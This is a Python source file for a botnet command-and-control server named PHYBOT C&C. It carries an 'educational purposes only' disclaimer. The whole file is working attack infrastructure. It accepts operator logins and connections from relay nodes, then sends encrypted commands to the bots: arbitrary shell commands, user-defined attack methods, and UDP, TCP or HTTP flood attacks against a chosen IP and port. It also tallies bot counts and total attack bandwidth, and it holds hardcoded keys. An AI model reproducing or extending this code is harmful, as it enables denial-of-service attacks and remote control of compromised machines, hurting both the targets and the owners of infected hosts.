#!/usr/bin/python3

import socket
import threading
import sys
import time
from colorama import Fore, init
import hashlib
import json
from cryptography.fernet import Fernet
import os
import requests
from pystyle import Colors, Colorate
from config import c2_config_t as tconf, c2_config_addr as addrconf



__filename__="cnc"
__version__="2.0"
__author__="4lxprime"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
__infos__="This is a 'new version' of my old botnet B0T4N3T"



urlkey="VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
relaykey="gAAAAABi2DQ2aBL7F1w-YK7tJQwZb_lnZY099Q2iCXqcLbLZy75ULiQk_VYWFglVco5PJrr0X-Jov_OaGwmL5HL5oYGqpACT7IiGspfgByyXQgY6U5an0Hk="
enckeyD="kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="
passwd="b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
api_url="http://localhost/phybot/api/v2"
fer=Fernet(enckeyD)
bots=[]
rbots=[
    {'ip': '127.0.0.1', 'bots': 0}
]
temprbots=[
    {'ip': '127.0.0.1', 'bots': 0}
]
relay={}
speed=[]
ansi_clear = '\033[2J\033[H'
w=Fore.GREEN
y=Fore.WHITE
r=Fore.RESET
rd=Fore.RED
banner=f"""
            dMMMMb     dMP dMP    dMP dMP     dMMMMb    .aMMMb  dMMMMMMP
           dMP.dMP    dMP dMP    dMP.dMP     dMP"dMP   dMP"dMP    dMP
          dMMMMP"    dMMMMMP     VMMMMP     dMMMMK"   dMP dMP    dMP
         dMP        dMP dMP    dA .dMP     dMP.aMF   dMP.aMP    dMP
        dWP        dEP dAP     VREAP"     dNONYP"    VMOUP"    dSP

                    C                N                C
"""
banner=Colorate.Horizontal(Colors.yellow_to_red, banner, 2)



def cryptD(msg: str, encde=True):
    if encde:
        msg=fer.encrypt(msg)
    else: 
        msg=fer.decrypt(msg)
    return msg



def find_login(username: str, password: str):
    password=hashlib.sha256(password.encode()).hexdigest()
    req=f"{api_url}/login.php?urlkey={urlkey}&usr={username}&pass={password}"
    print(f"\n\n{req}\n\n\n\n")
    r=requests.get(req).json()
    if r=="ok":
        return True
    else:
        return False


def relay_api(data, act: bool):
    ip=data['ip']
    bots=data['bots']
    url=f"{api_url}/relays.php?urlkey={urlkey}&ip={ip}&bots={bots}&act={act}"
    try:
        r=requests.get(url).json()
        print(r)
        if r=="ok":
            return True
        else:
            return False
    except Exception as e:
        print(f"error \n{url}\n{e}\n\n")


def send(socket, data: str, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())



def broadcast(data: str):
    print(f"send {data}")
    dead_relay = []
    for relays in list(relay):
        try:
            send(relays, f'{data}', False, False)
        except:
            dead_relay.append(relay)
    for relays in list(dead_relay):
        relay.pop(relays)
        relays.close()



def ping():
    while 1:
        dead_relay = []
        for relays in list(relay):
            try:
                relays.settimeout(3)
                send(relays, 'RPING', False, False)
                if relays.recv(1024).decode() != f'RPONG[p:{relaykey}]':
                    dead_relay.append(relays)
            except:
                print("except rping")
                dead_relay.append(relays)
            
        for relays in list(dead_relay):
            relay.pop(relays)
            relays.close()
        time.sleep(tconf.ping_t)



def _ping():
    dead_relay = []
    for relays in list(relay):
        try:
            relays.settimeout(3)
            send(relays, 'RPING', False, False)
            if relays.recv(1024).decode() != f'RPONG[p:{relaykey}]':
                dead_relay.append(relays)
        except:
            dead_relay.append(relays)
        
    for relays in list(dead_relay):
        relay.pop(relays)
        relays.close()



def net():
    while 1:
        while speed!=[]:
            for i in speed:
                speed.remove(i)
        print(speed)
        dead_relay = []
        for relays in list(relay):
            print(relays)
            try:
                relays.settimeout(3)
                send(relays, f'RNETSPEED', False, False)
                data=relays.recv(1024).decode()
                print(data)
                try:
                    if data=="":
                        print('not')
                        dead_relay.append(relays)
                    else:
                        speed.append(int(data))
                        print('ok')
                except:
                    speed.append(int(data))
            except:
                print("except")
                dead_relay.append(relays)
            
        for relays in list(dead_relay):
            relay.pop(relays)
            relays.close()
        time.sleep(tconf.net_t)



def _net():
    while speed!=[]:
        for i in speed:
            speed.remove(i)
    print(speed)
    dead_relay = []
    for relays in list(relay):
        print(relays)
        try:
            relays.settimeout(3)
            send(relays, f'RNETSPEED', False, False)
            data=relays.recv(1024).decode()
            print(data)
            try:
                if data=="":
                    print('not')
                    dead_relay.append(relays)
                else:
                    speed.append(int(data))
                    print('ok')
            except:
                speed.append(int(data))
        except:
            print("except")
            dead_relay.append(relays)
        
    for relays in list(dead_relay):
        relay.pop(relays)
        relays.close()



def getbot():
    while 1:
        while bots!=[]:
            for i in bots:
                bots.remove(i)
        while temprbots!=[]:
            for i in temprbots:
                temprbots.remove(i)
        print(bots)
        dead_relay = []
        for relays in list(relay):
            try:
                relays.settimeout(3)
                send(relays, f'RNETBOTS', False, False)
                data=relays.recv(1024).decode()
                print(data)
                try:
                    temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
                    print({'ip': relays.getpeername()[0], 'bots': int(data)})
                except Exception as e:
                    print(e)
                print(temprbots)
                try:
                    if data=="":
                        print('not')
                        dead_relay.append(relays)
                    else:
                        bots.append(int(data))
                        print('ok')
                except:
                    bots.append(int(data))
            except Exception as e:
                print(f"except getbot\n\n{e}\n\n")
                dead_relay.append(relays)
        while rbots!=[]:
            for i in rbots:
                rbots.remove(i)
        for i in temprbots:
            rbots.append(i)
            if relay_api(i, False):
                print('ok')
            else:
                print("relay_api error")
                    
        for relays in list(dead_relay):
            relay.pop(relays)
            relays.close()
        time.sleep(tconf.getbot_t)
        
        

def _getbot():
    while bots!=[]:
        for i in bots:
            bots.remove(i)
    while temprbots!=[]:
        for i in temprbots:
            temprbots.remove(i)
    print(bots)
    dead_relay = []
    for relays in list(relay):
        try:
            relays.settimeout(3)
            send(relays, f'RNETBOTS', False, False)
            data=relays.recv(1024).decode()
            print(data)
            try:
                temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
                print({'ip': relays.getpeername()[0], 'bots': int(data)})
            except Exception as e:
                print(e)
            print(temprbots)
            try:
                if data=="":
                    print('not')
                    dead_relay.append(relays)
                else:
                    bots.append(int(data))
                    print('ok')
            except:
                bots.append(int(data))
        except Exception as e:
            print(f"except getbot\n\n{e}\n\n")
            dead_relay.append(relays)
    while rbots!=[]:
        for i in rbots:
            rbots.remove(i)
    for i in temprbots:
        rbots.append(i)
        if relay_api(i, False):
            print('ok')
        else:
            print("relay_api error")
                
    for relays in list(dead_relay):
        relay.pop(relays)
        relays.close()



def _smsg(ip: str, port: int, data: str):
    dead_relay = []
    for relays in list(relay):
        try:
            relays.settimeout(3)
            send(relays, str({'enc': {}, 'dec': {}, 'target': {'ip': ip, 'port': port, 'data': data}}), False, False)
            if relays.recv(1024).decode() != f"SMSG[p:{relaykey}]":
                dead_relay.append(relays)
        except:
            dead_relay.append(relays)
        
    for relays in list(dead_relay):
        relay.pop(relays)
        relays.close()



       


def update_title(client, username: str):
    while 1:
        try: 
            send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {sum(bots)}  |  Relay: {len(relay)}  |  Speed: {sum(speed)/125000} Gbps  |  {time.asctime(time.localtime())}\a', False)
            time.sleep(tconf.uptitl_t)
        except:
            client.close()



def command_line(client, username: str):
    for x in banner.split('\n'):
        send(client, x)
    send(client, "\n")
    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {sum(bots)}", 1)+f"{y})")
    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Relays: {len(relay)}", 1)+f"{y})")
    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Speed: {sum(speed)/125000} Gbps", 1)+f"{y})")
    send(client, "\n")
    prompt=f'{Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)}{y}.{Colorate.Horizontal(Colors.blue_to_purple, username, 1)}{y} /> '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            cmd=data
            
            if command == 'HELP':
                tab=Colorate.Vertical(Colors.yellow_to_red, f"""
╔═══════════════╦══════════════════════════════════════════╗
║  HELP         ║   Shows list of commands                 ║
╠═══════════════╬══════════════════════════════════════════╣
║  CMD          ║   Send an command to all bots            ║
╠═══════════════╬══════════════════════════════════════════╣
║  ATTACK       ║   Start an attack                        ║
╠═══════════════╬══════════════════════════════════════════╣
║  MSG          ║   Send an message into the bots p2p net  ║
╠═══════════════╬══════════════════════════════════════════╣
║  METHOD HELP  ║   List all Method commands               ║
╠═══════════════╬══════════════════════════════════════════╣
║  BOTS         ║   List all the connected bots            ║
╠═══════════════╬══════════════════════════════════════════╣
║  SPEED        ║   Get the speed of all bots              ║
╠═══════════════╬══════════════════════════════════════════╣
║  PING         ║   Ping all relay                         ║
╠═══════════════╬══════════════════════════════════════════╣
║  CLEAR        ║   Clears the screen                      ║
╠═══════════════╬══════════════════════════════════════════╣
║  LOGOUT       ║   Disconnects from CnC server            ║
╚═══════════════╩══════════════════════════════════════════╝

                """, 1)
                for x in tab.split("\n"):
                    send(client, x)
                            
            elif data=="METHOD CLEAR":
                broadcast(data)
                with open("method.json", "w") as f:
                    f.write("{}")
            
            elif data=="METHOD HELP":
                tab=Colorate.Vertical(Colors.yellow_to_red, f"""
╔══════════════════╦══════════════════════════════════════════╗
║  METHOD CREATE   ║   Send a new ATTACK method to all bots   ║
╠══════════════════╬══════════════════════════════════════════╣
║  METHOD CLEAR    ║   Clear all methods                      ║
╠══════════════════╬══════════════════════════════════════════╣
║  METHOD          ║   Start an attack with your method       ║
╠══════════════════╬══════════════════════════════════════════╣
║  METHODS         ║   List all methods                       ║
╚══════════════════╩══════════════════════════════════════════╝

                """, 1)
                for x in tab.split("\n"):
                    send(client, x)

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)
                send(client, "\n")
                send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {sum(bots)}", 1)+f"{y})")
                send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Relays: {len(relay)}", 1)+f"{y})")
                send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Speed: {sum(speed)/125000} Gbps", 1)+f"{y})")
                send(client, "\n")

            elif command == 'LOGOUT':
                send(client, 'Goodbye')
                time.sleep(1)
                break
            
            elif command=="CMD":
                if len(data.split(" "))==1:
                    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"CMD need <command> argument!", 1)+f"{y})")
                else:
                    rcmd=str(data)
                    broadcast(cryptD(rcmd.encode()))
            
            elif command=="SPEED":
                try:
                    _net()
                    send(client, f"{sum(speed)/125000} Gbps")
                except Exception as e:
                    send(client, f"{rd}[{y}!{rd}]{r} Error: {e}")
                
            elif command=="BOTS":
                try:
                    _getbot()
                    send(client, f"{sum(bots)} Bots")
                except Exception as e:
                    send(client, f"{rd}[{y}!{rd}]{r} Error: {e}")
            
            elif command=="PING":
                _ping()
            
            elif command=="METHOD":
                try:
                    if len(data.split(" "))==1:
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"METHOD need <name> arguments!", 1)+f"{y})")
                    elif len(data.split(" "))!=1:
                        cmd=str(data)
                        args=data.replace("METHOD ", "")
                        arg=args.split(" ")
                        if arg[0]=='CREATE':
                            if len(data.split(" "))<4:
                                send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"METHOD CREATE need <name> and <command> arguments!", 1)+f"{y})")
                            else:
                                broadcast(cryptD(cmd.encode()))
                                name=arg[1]
                                cmd=args.replace("CREATE ", "").replace(f"{name} ", "")
                                print(cmd)
                                with open("method.json", "r") as f:
                                    tb1=json.load(f)
                                    tb1=str(tb1).replace('{"', '"').replace("{}", "")
                                    tb1=str(tb1).replace("}    ", "")
                                    tb="""""" + "'" + name + "'" + """: {
    "name": """ + "'" + name + "'" + """,
    "command": """ + "'" + cmd + "'" + """
}"""
                                if not tb1 == None:
                                    tb="{"+tb1+",\n"+tb+"\n}    "
                                else:
                                    tb="{"+tb+"\n}    "
                                tb=tb.replace("{{", "{").replace("}}", "}")
                                with open("method.json", "w") as f:
                                    f.write(tb.replace("'", '"').replace("{,", "{"))
                        elif arg[0]!='CREATE':
                            broadcast(cryptD(cmd.encode()))
                            send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.cyan_to_green, f"Command {arg[0]} send to all bots!", 1)+f"{y})")
                except Exception as e:
                    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"Error: {e}", 1)+f"{y})")
            
            elif command=="METHODS":
                args=data.replace("METHOD ", "")
                arg=args.split(" ")
                name=arg[0]
                if os.path.exists("method.json"):
                    with open("method.json", "r") as f:
                        data = json.load(f)
                        for (key, val) in data.items():
                            send(client, f"{key}: {val['command']}")
                else:
                    with open("method.json", "w") as f:
                        f.write("{}")
                    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"Nothing found", 1)+f"{y})")
            
            elif command=="MSG":
                if len(args)<4:
                    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, "MSG need <ip> <port> <data>", 1)+f"{y})")
                try:
                    ip=args[1]
                    port=args[2]
                    data=args[3]
                    _smsg(ip, port, data)
                except Exception as e:
                    send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"Error: {e}", 1)+f"{y})")

            elif str(cmd).startswith("ATTACK"):
                try:
                    cmd=str(cmd)
                    print(cmd)
                    args=cmd.replace("ATTACK", "")
                    args=args.split(" ")
                    args.remove("")
                    if len(args)!=4:
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"ATTACK need <ip> <port> <attack time> <UDP or TCP or HTTP> arguments!", 1)+f"{y})")
                    else:
                        attackIP=args[0]
                        attackP=args[1]
                        tps=args[2]
                        method=args[3]
                        cmd=f"{attackIP}:{attackP}/{tps}-{method}"
                        broadcast(cryptD(cmd.encode()))
                        _net()
                        broadcast(cryptD(cmd.encode()))
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {len(bots)}", 1)+f"{y})")
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack IP: {attackIP}", 1)+f"{y})")
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Port: {attackP}", 1)+f"{y})")
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Time: {tps}", 1)+f"{y})")
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Method: {method}", 1)+f"{y})")
                        send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Speed: {sum(speed)/125000} Gbps", 1)+f"{y})")
                        send(client, "\n")
                except Exception as e: send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"Attack Error: {e}", 1)+f"{y})")
            else:
                send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"Unknown Command", 1)+f"{y})")

            send(client, prompt, False)
        except:
            break
    client.close()



def handle_client(client, address):

    while 1:
        send(client, ansi_clear, False)
        send(client, f'{y}Username{y} > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{y}Password{y} > {Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break


    if password!=relaykey:
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, f'{rd}[{y}!{rd}]{r} Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=(client, username)).start()
        
    elif password==relaykey:
        for x in relay.values():
            if x[0] == address[0]:
                client.close()
                return
        relay.update({client: address})
    
    else:
        client.close()



def main():
    if int(addrconf.cnc_p)!=0:
        port=addrconf.cnc_p

    else:
        if len(sys.argv) != 2:
            print(f'Usage: py {sys.argv[0]} <c&c port>')
            exit()

        port = sys.argv[1]
        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            print('Invalid C2 port')
            exit()
        port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    if relay_api({'ip': '', 'bots': ''}, True):
        pass
    else:
        print('Failed to relay api')
        exit()

    sock.listen()
    
    threading.Thread(target=ping).start()
    threading.Thread(target=net).start()
    threading.Thread(target=getbot).start()

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()